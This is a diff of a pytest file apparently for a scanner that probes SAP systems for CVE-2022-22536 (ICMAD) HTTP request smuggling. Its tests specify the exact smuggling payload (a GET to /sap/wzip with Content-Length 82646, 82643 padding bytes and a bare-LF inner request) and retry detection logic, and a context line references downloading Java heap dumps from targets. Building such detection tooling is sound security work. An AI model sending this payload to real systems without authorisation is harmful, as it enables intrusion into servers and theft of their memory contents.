@@ -125,42 +125,50 @@ def test_patch_table_has_no_unexpected_entries():
 # ---------------------------------------------------------------------------
 
 def test_detect_payload_advertises_canonical_cl():
+    """Outer is GET (not POST) per the Onapsis canonical — the desync
+    is that the MPI buffer reads CL bytes but the dispatcher processes
+    GET as body-less, leaving the trailing bytes for re-parse."""
     payload = _build_detect_payload("example.host", 8000)
     assert b"Content-Length: 82646\r\n" in payload
-    assert b"Connection: close\r\n" in payload
     assert b"Host: example.host:8000\r\n" in payload
-    assert payload.startswith(
-        b"POST /sap/admin/public/default.html HTTP/1.1\r\n")
+    assert payload.startswith(b"GET /sap/wzip HTTP/1.1\r\n"), (
+        "Onapsis canonical uses GET (not POST) — POST signals the "
+        "dispatcher to expect a body and consume it normally; only "
+        "GET-with-CL produces the desync.")
 
 
 def test_detect_payload_honours_custom_outer_path():
-    """When the Onapsis canonical path 503's on a target (because the
-    WD's URL filter denies it), the operator can point the smuggle at
-    a path that actually forwards to the backend — e.g. /nwa/ on an
-    AS Java WD config."""
+    """When the Onapsis canonical path 503's on a target (e.g. the WD
+    URL filter denies /sap/wzip), the operator can point the smuggle
+    at a different forwarding path."""
     payload = _build_detect_payload("h", 1, outer_path="/nwa/")
-    assert payload.startswith(b"POST /nwa/ HTTP/1.1\r\n")
-    # CL header still the canonical Onapsis magic number
+    assert payload.startswith(b"GET /nwa/ HTTP/1.1\r\n")
     assert b"Content-Length: 82646\r\n" in payload
-    # Inner smuggle still lives in the tail
-    assert payload.endswith(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n")
 
 
 def test_detect_payload_contains_smuggled_inner_request():
     payload = _build_detect_payload("h", 1)
-    # Inner request lives in the trailing bytes
-    assert payload.endswith(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n")
+    # Inner request prefixed by bare-LF (\n) per the Onapsis canonical —
+    # the WD's HTTP-line parser accepts LF-only as a request-line
+    # boundary in the buffer re-parse, which is what triggers the
+    # second response.
+    assert payload.endswith(b"\nGET /sap/wzip HTTP/1.1\r\nHost: 1\r\n\r\n")
 
 
-def test_detect_payload_total_length_consistent():
-    """Payload = header_len + 82646 body bytes."""
+def test_detect_payload_uses_padding_and_inner_structure():
+    """Body = 82643 X's + smuggled inner.  Advertised CL is 82646
+    but actual body is longer — the trailing bytes past CL are what
+    the WD's MPI re-parses as a fresh request."""
     payload = _build_detect_payload("h", 1)
     head_end = payload.find(b"\r\n\r\n") + 4
     body = payload[head_end:]
-    assert len(body) == 82646 + len(b"\r\n\r\n" + b"GET / HTTP/1.1\r\n"
-                                       b"Host: x\r\n\r\n") - 4
-    # The advertised CL exactly equals 82646 — the "lie" is that body is
-    # actually 82646 + 4 + len(inner), but the outer parser stops at 82646.
+    assert body[:82643] == b"X" * 82643, "padding must be 82643 X's"
+    assert body[82643:].startswith(b"\nGET "), \
+        "inner request must start with bare-LF immediately after padding"
+    # Body extends past the advertised CL — the lie that's the smuggle
+    assert len(body) > 82646
+    inner = b"\nGET /sap/wzip HTTP/1.1\r\nHost: 1\r\n\r\n"
+    assert body[82643:] == inner
 
 
 # ---------------------------------------------------------------------------
@@ -548,6 +556,84 @@ def test_download_heap_dump_streams_to_disk(monkeypatch, tmp_path):
         on_disk = f.read()
     assert on_disk == hprof_payload
     assert on_disk[:18] == b"JAVA PROFILE 1.0.2"
+
+
+def test_probe_retries_break_on_first_hit(monkeypatch):
+    """retries=3 — if attempt 1 already sees 2 responses, stop early."""
+    import sap_cve_2022_22536 as mod
+    mod.clear_throttle()
+    open_calls = []
+    def fake_open(*a, **k):
+        open_calls.append(1)
+        class S:
+            sent = False
+            def settimeout(self, *a): pass
+            def send(self, data): return len(data)
+            def recv(self_, n):
+                if self_.sent: return b""
+                self_.sent = True
+                return (b"HTTP/1.1 404 Not Found\r\nServer: backend\r\n\r\nbody"
+                        b"HTTP/1.0 403 Forbidden\r\n\r\nx")
+            def close(self): pass
+        return S()
+    monkeypatch.setattr(mod, "_open_socket", fake_open)
+    r = mod.probe_icmad("h", 1, retries=3, verbose=False)
+    assert r["vulnerable"] is True
+    assert r["responses"] == [404, 403]
+    assert r["attempts"] == 1
+    assert len(open_calls) == 1, ("Should not open additional sockets "
+                                    "after the first attempt hits")
+
+
+def test_probe_retries_persist_through_misses(monkeypatch):
+    """retries=3 — if attempt 1 misses but attempt 2 hits, vulnerable=True."""
+    import sap_cve_2022_22536 as mod
+    mod.clear_throttle()
+    attempt_idx = [0]
+    def fake_open(*a, **k):
+        attempt_idx[0] += 1
+        n = attempt_idx[0]
+        class S:
+            sent = False
+            def settimeout(self, *a): pass
+            def send(self, data): return len(data)
+            def recv(self_, sz):
+                if self_.sent: return b""
+                self_.sent = True
+                # Attempts 1 and 3: single response (miss).  Attempt 2: 2 responses (hit).
+                if n == 2:
+                    return (b"HTTP/1.1 404 Not Found\r\n\r\nbody"
+                            b"HTTP/1.0 403 Forbidden\r\n\r\nx")
+                return b"HTTP/1.1 404 Not Found\r\n\r\nbody"
+            def close(self): pass
+        return S()
+    monkeypatch.setattr(mod, "_open_socket", fake_open)
+    r = mod.probe_icmad("h", 1, retries=3, verbose=False)
+    assert r["vulnerable"] is True
+    assert r["attempts"] == 2     # Stopped after the hit
+    assert r["responses"] == [404, 403]
+
+
+def test_probe_retries_all_miss_returns_best_buffer(monkeypatch):
+    """retries=3, all 3 attempts miss — vulnerable=False, attempts=3."""
+    import sap_cve_2022_22536 as mod
+    mod.clear_throttle()
+    def fake_open(*a, **k):
+        class S:
+            sent = False
+            def settimeout(self, *a): pass
+            def send(self, data): return len(data)
+            def recv(self_, n):
+                if self_.sent: return b""
+                self_.sent = True
+                return b"HTTP/1.1 404 Not Found\r\n\r\nbody"
+            def close(self): pass
+        return S()
+    monkeypatch.setattr(mod, "_open_socket", fake_open)
+    r = mod.probe_icmad("h", 1, retries=3, verbose=False)
+    assert r["vulnerable"] is False
+    assert r["attempts"] == 3
+    assert r["responses"] == [404]
 
 
 def test_throttle_blocks_second_probe_within_window(monkeypatch):
